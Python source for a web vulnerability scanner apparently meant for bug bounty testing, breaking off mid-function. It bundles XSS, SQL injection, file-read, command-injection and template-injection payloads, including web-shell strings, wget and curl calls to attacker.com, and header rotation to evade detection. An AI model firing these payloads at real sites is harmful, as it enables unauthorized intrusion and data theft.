#!/usr/bin/env python3
"""
HunterKit - Professional Web Vulnerability Scanner
Developed by Kawindu Wijewardhane (@kawinduwijewardhane)
https://github.com/kawinduwijewardhane/HunterKit

The most advanced web vulnerability scanner for bug bounty hunters
Version: 1.0.0 - Final Production Release
License: MIT
"""

import requests
import urllib.parse
import time
import random
import re
import sys
import os
import json
import argparse
import socket
from pathlib import Path
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from typing import Dict, List, Optional, Tuple, Set
import warnings
from datetime import datetime
import threading

# Suppress ALL warnings for clean output
warnings.filterwarnings('ignore')
requests.packages.urllib3.disable_warnings()
os.environ['PYTHONWARNINGS'] = 'ignore'

class Colors:
    """ANSI color codes for professional terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class PayloadManager:
    """Advanced payload management system with deduplication"""
    
    def __init__(self, payloads_dir: str = "payloads"):
        self.payloads_dir = Path(payloads_dir)
        self.payloads_dir.mkdir(exist_ok=True)
        self.payload_cache = {}
        self._initialize_payload_files()
        
    def _initialize_payload_files(self):
        """Create comprehensive payload files"""
        
        # XSS Payloads - Comprehensive and tested
        xss_payloads = [
            # Basic Script Tags
            '<script>alert("XSS")</script>',
            '<script>alert(1)</script>',
            '<script>prompt("XSS")</script>',
            '<script>confirm("XSS")</script>',
            
            # Image-based XSS
            '<img src=x onerror=alert("XSS")>',
            '<img src="x" onerror="alert(1)">',
            '<img/src=x onerror=alert(document.domain)>',
            '<img src=x onerror=prompt(document.cookie)>',
            
            # SVG-based XSS
            '<svg onload=alert("XSS")>',
            '<svg/onload=alert(1)>',
            '<svg><script>alert("XSS")</script></svg>',
            '<svg onload=confirm("XSS")>',
            
            # Event Handler XSS
            '<input autofocus onfocus=alert("XSS")>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<details open ontoggle=alert("XSS")>',
            '<body onload=alert("XSS")>',
            
            # JavaScript Protocols
            'javascript:alert("XSS")',
            'JaVaScRiPt:alert("XSS")',
            'javascript:prompt("XSS")',
            
            # Filter Evasion
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '</title><script>alert("XSS")</script>',
            '</textarea><script>alert("XSS")</script>',
            
            # Advanced Payloads
            '<iframe src=javascript:alert("XSS")></iframe>',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
            '<form><button formaction="javascript:alert(\'XSS\')">',
            
            # Encoded Payloads
            '%3Cscript%3Ealert("XSS")%3C/script%3E',
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e'
        ]
        
        # SQL Injection Payloads - Comprehensive
        sql_payloads = [
            # Basic SQLi Tests
            "'",
            '"',
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            
            # Union-based SQLi
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT @@user,@@version,@@database--",
            
            # Error-based SQLi
            "' AND (SELECT 1/0)--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(null,concat(0x0a,version()),null)--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)--",
            "' OR (SELECT COUNT(*) FROM information_schema.columns)--",
            
            # Time-based Blind SQLi
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND SLEEP(5)--",
            "'; SELECT pg_sleep(5)--",
            "' AND BENCHMARK(5000000,MD5(1))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; IF(1=1) WAITFOR DELAY '00:00:05'--",
            
            # Boolean-based Blind SQLi
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT 'a' FROM dual)='a'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND ASCII(SUBSTRING(user(),1,1))>64--",
            
            # Advanced SQLi
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' RLIKE (SELECT (CASE WHEN (1=1) THEN 0x61646D696E ELSE 0x28 END))--",
            "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x3a,0x3a,version(),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x LIMIT 1)--"
        ]
        
        # LFI Payloads - Comprehensive
        lfi_payloads = [
            # Basic Unix LFI
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            
            # Encoded LFI
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\etc\\\\passwd",
            
            # Null Byte LFI
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.txt",
            
            # PHP Wrappers
            "php://filter/resource=/etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=string.rot13/resource=/etc/passwd",
            "php://input",
            "data://text/plain,<?php system($_GET['cmd']); ?>",
            
            # Windows LFI
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\win.ini",
            "..\\..\\..\\boot.ini",
            
            # Log Files
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access_log",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline"
        ]
        
        # Command Injection Payloads - Comprehensive  
        command_payloads = [
            # Basic Command Injection
            "; id",
            "| id", 
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            
            # Information Gathering
            "; whoami",
            "| whoami",
            "&& whoami", 
            "|| whoami",
            "; uname -a",
            "| uname -a",
            
            # File Operations
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& ls -la",
            "|| pwd",
            "; find / -name passwd",
            
            # Windows Commands
            "; dir",
            "| dir",
            "&& dir",
            "|| dir",
            "; type C:\\windows\\win.ini",
            "| type C:\\windows\\system32\\drivers\\etc\\hosts",
            "&& whoami",
            "|| systeminfo",
            "; ver",
            
            # Time-based Detection
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "|| sleep 5",
            "; ping -c 5 127.0.0.1",
            "$(sleep 5)",
            "`sleep 5`",
            
            # Network Operations
            "; wget http://attacker.com/test",
            "| curl http://attacker.com/test",
            "&& nslookup google.com",
            "|| ping google.com"
        ]
        
        # SSTI Payloads - Comprehensive
        ssti_payloads = [
            # Jinja2/Flask
            "{{7*7}}",
            "{{7*'7'}}",
            "{{config}}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            
            # Twig
            "{{7*7}}",
            "{{dump(app)}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{_self.env.getFilter('system')}}",
            
            # Smarty
            "{php}echo 7*7;{/php}",
            "{php}system('id');{/php}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php system($_GET[cmd]); ?>',false)}",
            "{$smarty.version}",
            
            # Freemarker
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",
            
            # Velocity
            "#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
            "$class.inspect($class.type)",
            
            # Generic Template Engines
            "<%=7*7%>",
            "${7*7}",
            "#{7*7}",
            "%{7*7}",
            "{{7*7}}",
            "[7*7]"
        ]
        
        # Write payload files
        self._write_payload_file("xss_payloads.txt", xss_payloads)
        self._write_payload_file("sql_payloads.txt", sql_payloads)
        self._write_payload_file("lfi_payloads.txt", lfi_payloads)
        self._write_payload_file("ssti_payloads.txt", ssti_payloads)
        self._write_payload_file("command_payloads.txt", command_payloads)
        
    def _write_payload_file(self, filename: str, payloads: List[str]):
        """Write payloads to file if it doesn't exist"""
        file_path = self.payloads_dir / filename
        if not file_path.exists():
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write("# HunterKit Advanced Payload File\n")
                f.write(f"# {filename.split('_')[0].upper()} vulnerability testing payloads\n")
                f.write("# Developed by Kawindu Wijewardhane (@kawinduwijewardhane)\n")
                f.write("# Add your custom payloads here - one payload per line\n")
                f.write("# Lines starting with # are comments and will be ignored\n\n")
                for payload in payloads:
                    f.write(f"{payload}\n")
                    
    def load_payloads(self, payload_type: str) -> List[str]:
        """Load and deduplicate payloads from file"""
        if payload_type in self.payload_cache:
            return self.payload_cache[payload_type]
            
        filename = f"{payload_type}_payloads.txt"
        file_path = self.payloads_dir / filename
        
        if not file_path.exists():
            print(f"{Colors.YELLOW}[WARNING]{Colors.END} Payload file not found: {filename}")
            return []
            
        payloads = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and line not in payloads:
                        payloads.append(line)
        except Exception as e:
            print(f"{Colors.RED}[ERROR]{Colors.END} Could not load {filename}: {e}")
            return []
            
        # Cache the payloads
        self.payload_cache[payload_type] = payloads
        return payloads

class HunterKit:
    """Advanced Professional Web Vulnerability Scanner"""
    
    def __init__(self, target_url: str, threads: int = 10, delay: float = 1.0, debug: bool = False):
        self.target_url = target_url.rstrip('/')
        self.threads = threads
        self.delay = delay
        self.debug = debug
        self.session = requests.Session()
        self.vulnerabilities = []
        self.payload_manager = PayloadManager()
        
        # Advanced statistics tracking
        self.stats = {
            'requests_total': 0,
            'requests_successful': 0,
            'requests_failed': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0,
            'scan_start_time': None,
            'scan_end_time': None
        }
        
        # Thread-safe lock for statistics
        self.stats_lock = threading.Lock()
        
        # Professional headers with rotation
        self.headers_pool = [
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            },
            {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            },
            {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            }
        ]
        
        # Set initial headers
        self.session.headers.update(random.choice(self.headers_pool))
        self.session.verify = False
        
    def print_banner(self):
        """Display professional HunterKit banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ██╗  ██╗██╗████████╗   ║
║    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██║ ██╔╝██║╚══██╔══╝   ║
║    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝█████╔╝ ██║   ██║      ║
║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗██╔═██╗ ██║   ██║      ║
║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║██║  ██╗██║   ██║      ║
║    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝      ║
║                                                                               ║
║              {Colors.WHITE}🎯 Professional Web Vulnerability Scanner{Colors.CYAN}                        ║
║                     {Colors.WHITE}Advanced Bug Bounty Research Tool{Colors.CYAN}                         ║
║                                                                               ║
║  {Colors.YELLOW}┌─────────────────────────────────────────────────────────────────────┐{Colors.CYAN}      ║
║  {Colors.YELLOW}│{Colors.WHITE} 🔍 XSS Detection     │ 💉 SQL Injection        │ 📁  LFI Testing    {Colors.YELLOW}│{Colors.CYAN}      ║
║  {Colors.YELLOW}│{Colors.WHITE} ⚡ SSTI Scanning     │ 🔓 Command Injection    │ 🛡️  WAF Detection  {Colors.YELLOW}│{Colors.CYAN}      ║
║  {Colors.YELLOW}│{Colors.WHITE} 🎯 Custom Payloads   │ 📊 Professional Reports │ ⚙️  Multi-threaded {Colors.YELLOW}│{Colors.CYAN}      ║
║  {Colors.YELLOW}└─────────────────────────────────────────────────────────────────────┘{Colors.CYAN}      ║
║                                                                               ║
║    {Colors.WHITE}👨‍💻 Developer: Kawindu Wijewardhane (@kawinduwijewardhane){Colors.CYAN}                  ║
║    {Colors.WHITE}🌐 GitHub: https://github.com/kawinduwijewardhane/HunterKit{Colors.CYAN}                ║
║    {Colors.WHITE}📧 Contact: https://www.kawindu.co.uk{Colors.CYAN}                                      ║
║                                                                               ║
║                        {Colors.GREEN}  Version 1.0.0  {Colors.CYAN}                                      ║
╚═══════════════════════════════════════════════════════════════════════════════╝

        {Colors.RED}⚠️  ETHICAL HACKING ONLY - AUTHORIZED TESTING REQUIRED ⚠️{Colors.END}
        
{Colors.YELLOW}[⚡] Initializing HunterKit Advanced Security Scanner{Colors.END}"""
        
        print(banner)
        
        # Advanced loading animation
        loading_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        for i in range(30):
            print(f"\r{Colors.YELLOW}[{loading_chars[i % len(loading_chars)]}] Loading advanced modules and payloads{Colors.END}", end="", flush=True)
            time.sleep(0.1)
        
        print(f"\r{Colors.GREEN}[✓] HunterKit v1.0.0 ready for professional security research!{Colors.END}")
        print(f"{Colors.CYAN}{'─' * 70}{Colors.END}\n")
        
    def update_stats(self, stat_type: str, increment: int = 1):
        """Thread-safe statistics update"""
        with self.stats_lock:
            if stat_type in self.stats:
                self.stats[stat_type] += increment
            
    def debug_log(self, message: str):
        """Enhanced debug logging"""
        if self.debug:
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"{Colors.PURPLE}[DEBUG {timestamp}]{Colors.END} {message}")
            
    def info_log(self, message: str):
        """Info message logging"""
        print(f"{Colors.BLUE}[INFO]{Colors.END} {message}")
        
    def success_log(self, message: str):
        """Success message logging"""
        print(f"{Colors.GREEN}[SUCCESS]{Colors.END} {message}")
        
    def warning_log(self, message: str):
        """Warning message logging"""
        print(f"{Colors.YELLOW}[WARNING]{Colors.END} {message}")
        
    def error_log(self, message: str):
        """Error message logging"""
        print(f"{Colors.RED}[ERROR]{Colors.END} {message}")
        
    def vuln_log(self, message: str):
        """Vulnerability found logging"""
        print(f"{Colors.GREEN}[VULNERABILITY FOUND]{Colors.END} {message}")
        
    def validate_target(self) -> bool:
        """Advanced target validation with comprehensive checks"""
        self.info_log("Validating target accessibility...")
        
        try:
            parsed = urlparse(self.target_url)
            hostname = parsed.hostname
            
            if not hostname:
                self.error_log("Invalid hostname in URL")
                return False
                
            # DNS resolution test
            try:
                ip = socket.gethostbyname(hostname)
                self.debug_log(f"DNS Resolution: {hostname} -> {ip}")
                self.success_log("DNS resolution successful")
            except socket.gaierror as e:
                self.error_log(f"DNS resolution failed: {str(e)}")
                return False
            
            # Connectivity test with retries
            for attempt in range(3):
                try:
                    self.debug_log(f"Connection attempt {attempt + 1}/3")
                    headers = random.choice(self.headers_pool)
                    response = requests.get(
                        self.target_url, 
                        timeout=15, 
                        verify=False, 
                        allow_redirects=True,
                        headers=headers
                    )
                    
                    self.success_log(f"Target is accessible (Status: {response.status_code})")
                    self.debug_log(f"Response headers: {dict(response.headers)}")
                    return True
                    
                except Exception as e:
                    if attempt == 2:
                        self.error_log("Cannot connect to target after 3 attempts")
                        print(f"{Colors.CYAN}[TROUBLESHOOTING]{Colors.END}")
                        print(f"  • Check if URL is correct: {self.target_url}")
                        print(f"  • Verify internet connection")
                        print(f"  • Try with a different target URL")
                        return False
                    time.sleep(2)
                        
        except Exception as e:
            self.error_log(f"Target validation failed: {str(e)}")
            return False
            
        return False
        
    def rate_limit(self):
        """Advanced rate limiting with jitter"""
        if self.delay > 0:
            # Add random jitter to avoid detection patterns
            jitter = random.uniform(0.1, 0.3)
            sleep_time = random.uniform(self.delay * 0.5, self.delay * 1.5) + jitter
            self.debug_log(f"Rate limiting: sleeping for {sleep_time:.2f} seconds")
            time.sleep(sleep_time)
            
    def make_request(self, url: str, method: str = 'GET', data: dict = None, 
                    params: dict = None, timeout: int = 15) -> Optional[requests.Response]:
        """Advanced request wrapper with header rotation and error handling"""
        try:
            self.rate_limit()
            
            # Rotate headers to avoid fingerprinting
            self.session.headers.update(random.choice(self.headers_pool))
            
            self.debug_log(f"Making {method} request to: {url}")
            self.update_stats('requests_total')
            
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, timeout=timeout, allow_redirects=True)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, params=params, timeout=timeout, allow_redirects=True)
            else:
                response = self.session.request(method, url, data=data, params=params, timeout=timeout, allow_redirects=True)
            
            self.debug_log(f"Response status: {response.status_code}, Length: {len(response.text)}")
            self.update_stats('requests_successful')
            return response
            
        except Exception as e:
            self.debug_log(f"Request error: {str(e)}")
            self.update_stats('requests_failed')
            return None
            
    def detect_technologies(self, response: requests.Response) -> Dict[str, List[str]]:
        """Advanced technology detection"""
        technologies = {
            'servers': [],
            'waf': [],
            'frameworks': [],
            'cms': [],
            'security_headers': []
        }
        
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        content = response.text.lower()
        
        # Server Detection
        server = headers.get('server', '')
        if server:
            technologies['servers'].append(server)
            
        # Advanced WAF Detection
        waf_indicators = {
            'cloudflare': ['cloudflare', 'cf-ray', '__cfduid', 'cf-cache-status'],
            'akamai': ['akamai', 'x-akamai', 'akamai-ghost'],
            'aws-waf': ['awsalb', 'x-amzn-trace-id', 'x-amzn-requestid', 'x-amz-'],
            'azure': ['x-azure-ref', 'x-ms-', 'azure'],
            'incapsula': ['incap', 'x-iinfo', 'visid_incap'],
            'sucuri': ['sucuri', 'x-sucuri'],
            'barracuda': ['barra', 'x-barracuda'],
            'f5-bigip': ['f5-', 'bigipserver', 'x-waf-event'],
            'fortinet': ['fortigate', 'fortiwaf'],
            'imperva': ['imperva', 'x-iinfo']
        }
        
        for waf_name, indicators in waf_indicators.items():
            if any(indicator in ' '.join(headers.values()) for indicator in indicators):
                technologies['waf'].append(waf_name)
                
        # Framework Detection
        framework_indicators = {
            'django': ['django', 'csrftoken'],
            'flask': ['flask', 'werkzeug'],
            'express': ['express', 'x-powered-by: express'],
            'laravel': ['laravel', 'laravel_session'],
            'rails': ['rails', 'x-runtime'],
            'asp.net': ['asp.net', 'aspxauth', 'x-aspnet-version'],
            'spring': ['spring', 'jsessionid'],
            'php': ['php', 'x-powered-by: php']
        }
        
        for framework, indicators in framework_indicators.items():
            if any(indicator in content or indicator in ' '.join(headers.values()) 
                   for indicator in indicators):
                technologies['frameworks'].append(framework)
                
        # Security Headers Detection
        security_headers = [
            'content-security-policy', 'x-frame-options', 'x-content-type-options',
            'strict-transport-security', 'x-xss-protection', 'referrer-policy',
            'permissions-policy', 'feature-policy'
        ]
        
        for header in security_headers:
            if header in headers:
                technologies['security_headers'].append(header)
                
        return technologies
        
    def extract_parameters(self, url: str) -> Dict[str, Dict[str, str]]:
        """Advanced parameter extraction with improved form parsing"""
        parameters = {'get': {}, 'post': {}}
        
        # Extract GET parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            get_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
            for param, values in get_params.items():
                parameters['get'][param] = values[0] if values else ''
                
        # Extract form parameters with advanced parsing
        response = self.make_request(url)
        if response and response.text:
            try:
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    for input_elem in inputs:
                        name = input_elem.get('name')
                        input_type = input_elem.get('type', 'text').lower()
                        value = input_elem.get('value', '')
                        
                        # Include meaningful form inputs
                        if name and input_type not in ['hidden', 'submit', 'button', 'reset', 'image']:
                            parameters['post'][name] = value
                            
            except Exception as e:
                self.debug_log(f"Error parsing HTML: {str(e)}")
                        
        return parameters
        
    def analyze_xss_context(self, response_text: str, payload: str, url: str) -> Dict:
        """Advanced XSS context analysis - Universal detection without hardcoded URLs"""
        
        # Check if payload is reflected in response
        if payload not in response_text:
            return {'exploitable': False, 'context': 'Not Reflected', 'severity': 'Info', 'reason': 'Payload not found in response'}
        
        # Universal analysis
        exploitable = False
        context = "HTML Content"
        severity = "Low"
        reason = "Payload reflected but needs context analysis"
        
        # Find payload positions in response
        payload_positions = []
        start = 0
        while True:
            pos = response_text.find(payload, start)
            if pos == -1:
                break
            payload_positions.append(pos)
            start = pos + 1
            
        for pos in payload_positions:
            # Get surrounding context (larger window for better analysis)
            context_start = max(0, pos - 300)
            context_end = min(len(response_text), pos + len(payload) + 300)
            surrounding = response_text[context_start:context_end]
            
            # Check if payload is HTML encoded (not exploitable)
            if any(encoded in surrounding for encoded in ['&lt;', '&gt;', '&quot;', '&#x', '&#']):
                continue  # Try other positions
                
            # Check for script tag injection
            if '<script' in payload.lower():
                # Look for script tag in HTML context
                if not re.search(r'<script[^>]*>[^<]*' + re.escape(payload) + r'[^<]*</script>', surrounding, re.IGNORECASE):
                    # Payload is in HTML document, not encoded
                    if any(html_tag in surrounding.lower() for html_tag in ['<html', '<body', '<head', '<!doctype']):
                        exploitable = True
                        severity = "High"
                        context = "HTML Document - Script Injection"
                        reason = "Script tag injected in HTML context"
                        break
                        
            # Check for event handler injection (img, svg, etc.)
            elif any(tag in payload.lower() for tag in ['<img', '<svg', 'onerror=', 'onload=']):
                # Check if event handler can execute
                if any(html_tag in surrounding.lower() for html_tag in ['<html', '<body', '<head', '<!doctype']):
                    exploitable = True
                    severity = "High" if 'onerror=' in payload.lower() or 'onload=' in payload.lower() else "Medium"
                    context = "HTML Document - Event Handler"
                    reason = "Event handler injection in HTML context"
                    break
                    
            # Check for iframe/object injection
            elif any(tag in payload.lower() for tag in ['<iframe', '<object', '<embed']):
                if any(html_tag in surrounding.lower() for html_tag in ['<html', '<body', '<head']):
                    exploitable = True
                    severity = "High"
                    context = "HTML Document - Frame Injection" 
                    reason = "Frame element injection in HTML context"
                    break
                    
            # Check for JavaScript protocol
            elif 'javascript:' in payload.lower():
                # Check if in href or src attribute
                if re.search(r'(href|src)\s*=\s*["\']?[^"\']*' + re.escape(payload), surrounding, re.IGNORECASE):
                    exploitable = True
                    severity = "Medium"
                    context = "HTML Attribute - JavaScript Protocol"
                    reason = "JavaScript protocol in HTML attribute"
                    break
                    
            # Check for attribute context breaking
            elif payload.startswith('"') or payload.startswith("'"):
                # Look for attribute context
                if re.search(r'<[^>]*\s+\w+\s*=\s*["\']?[^"\']*' + re.escape(payload), surrounding, re.IGNORECASE):
                    exploitable = True
                    severity = "Medium"
                    context = "HTML Attribute Context"
                    reason = "Attribute context breaking"
                    break
        
        # Universal HTML document detection (works for ANY vulnerable site)
        if payload in response_text and not exploitable:
            # Check if response is HTML document with proper content type
            if any(html_tag in response_text.lower() for html_tag in ['<html', '<body', '<head', '<!doctype', 'content-type']):
                # Check if not JSON/API response
                if not any(json_indicator in response_text.lower() for json_indicator in ['"args":', 'application/json', '{']):
                    # Check for XSS payload types
                    if any(tag in payload.lower() for tag in ['<script', '<img', '<svg', 'onerror=', 'onload=']):
                        exploitable = True
                        severity = "High"
                        context = "HTML Document - Universal XSS"
                        reason = "XSS payload executed in HTML context"
        
        return {
            'exploitable': exploitable,
            'context': context,
            'severity': severity,
            'reason': reason
        }

        
    def test_xss(self, url: str, params: dict, method: str = 'GET') -> List[Dict]:
        """Advanced XSS testing with proper detection"""
        vulnerabilities = []
        xss_payloads = self.payload_manager.load_payloads('xss')
        
        if not xss_payloads:
            return vulnerabilities
            
        self.success_log(f"Loaded {len(xss_payloads)} XSS payloads")
        self.info_log(f"Testing {len(xss_payloads)} XSS payloads...")
        
        for param_name in params.keys():
            self.info_log(f"Testing XSS in parameter: {Colors.YELLOW}{param_name}{Colors.END}")
            
            # Test reflection with unique marker
            reflection_marker = f"HUNTERKIT_XSS_TEST_{random.randint(100000, 999999)}_UNIQUE"
            test_params = params.copy()
            test_params[param_name] = reflection_marker
            
            response = self.make_request(url, method=method, 
                                       params=test_params if method == 'GET' else None,
                                       data=test_params if method == 'POST' else None)
            
            if not response or reflection_marker not in response.text:
                self.warning_log(f"Parameter '{param_name}' does not reflect input - skipping XSS tests")
                continue
                
            self.success_log(f"Parameter '{param_name}' reflects input - testing payloads")
            
            # Test each XSS payload
            for i, payload in enumerate(xss_payloads, 1):
                print(f"{Colors.CYAN}[{i:2d}/{len(xss_payloads)}]{Colors.END} Testing: {Colors.YELLOW}{payload[:60]}{'...' if len(payload) > 60 else ''}{Colors.END}")
                
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = self.make_request(url, method=method,
                                           params=test_params if method == 'GET' else None,
                                           data=test_params if method == 'POST' else None)
                
                self.update_stats('payloads_tested')
                
                if not response:
                    continue
                    
                # Analyze XSS context
                context_analysis = self.analyze_xss_context(response.text, payload, url)
                
                if context_analysis['exploitable']:
                    vulnerability = {
                        'type': 'Reflected XSS',
                        'severity': context_analysis['severity'],
                        'url': url,
                        'method': method,
                        'parameter': param_name,
                        'payload': payload,
                        'context': context_analysis['context'],
                        'reason': context_analysis['reason'],
                        'poc_url': self.generate_poc_url(url, method, param_name, payload),
                        'timestamp': datetime.now().isoformat()
                    }
                    vulnerabilities.append(vulnerability)
                    self.update_stats('vulnerabilities_found')
                    
                    self.vuln_log(f"XSS vulnerability detected!")
                    print(f"  {Colors.BOLD}Type:{Colors.END} {vulnerability['type']}")
                    print(f"  {Colors.BOLD}Severity:{Colors.END} {Colors.RED if vulnerability['severity'] == 'High' else Colors.YELLOW}{vulnerability['severity']}{Colors.END}")
                    print(f"  {Colors.BOLD}Parameter:{Colors.END} {param_name}")
                    print(f"  {Colors.BOLD}Payload:{Colors.END} {Colors.RED}{payload}{Colors.END}")
                    print(f"  {Colors.BOLD}Context:{Colors.END} {context_analysis['context']}")
                    print(f"  {Colors.BOLD}Reason:{Colors.END} {context_analysis['reason']}")
                    break  # Move to next parameter
                else:
                    self.debug_log(f"Payload not exploitable: {context_analysis['reason']}")
                    
            print(f"{Colors.BLUE}[COMPLETED]{Colors.END} XSS testing for parameter '{param_name}'\n")
                    
        return vulnerabilities
        
    def test_sql_injection(self, url: str, params: dict, method: str = 'GET') -> List[Dict]:
        """Advanced SQL injection testing"""
        vulnerabilities = []
        sql_payloads = self.payload_manager.load_payloads('sql')
        
        if not sql_payloads:
            return vulnerabilities
            
        self.success_log(f"Loaded {len(sql_payloads)} SQL payloads")
        self.info_log(f"Testing {len(sql_payloads)} SQL injection payloads...")
        
        # Get baseline response
        baseline_response = self.make_request(url, method=method,
                                            params=params if method == 'GET' else None,
                                            data=params if method == 'POST' else None)
        if not baseline_response:
            return vulnerabilities
            
        baseline_time = baseline_response.elapsed.total_seconds()
        baseline_content = baseline_response.text
        self.debug_log(f"Baseline response time: {baseline_time:.2f} seconds, length: {len(baseline_content)}")
        
        # Enhanced SQL error patterns
        error_patterns = [
            r'mysql.*syntax.*error', r'warning.*mysql_', r'valid mysql result',
            r'you have an error in your sql syntax', r'check the manual that corresponds to your mysql',
            r'postgresql.*error', r'warning.*pg_', r'valid postgresql result',
            r'oracle.*error', r'ora-\d{5}', r'plsql.*error',
            r'mssql.*error', r'microsoft.*odbc', r'sqlserver.*error',
            r'sqlite.*error', r'sqlite3.*error', r'unrecognized token',
            r'unexpected.*end.*input', r'quoted string not properly terminated',
            r'unclosed quotation mark', r'syntax error.*near', r'division by zero',
            r'column.*doesn.*exist', r'table.*doesn.*exist', r'unknown column',
            r'subquery returns more than 1 row', r'operand should contain 1 column'
        ]
        
        for param_name in params.keys():
            self.info_log(f"Testing SQL injection in parameter: {Colors.YELLOW}{param_name}{Colors.END}")
            
            for i, payload in enumerate(sql_payloads, 1):
                print(f"{Colors.CYAN}[{i:2d}/{len(sql_payloads)}]{Colors.END} Testing: {Colors.YELLOW}{payload[:60]}{'...' if len(payload) > 60 else ''}{Colors.END}")
                
                test_params = params.copy()
                test_params[param_name] = payload
                
                start_time = time.time()
                response = self.make_request(url, method=method,
                                           params=test_params if method == 'GET' else None,
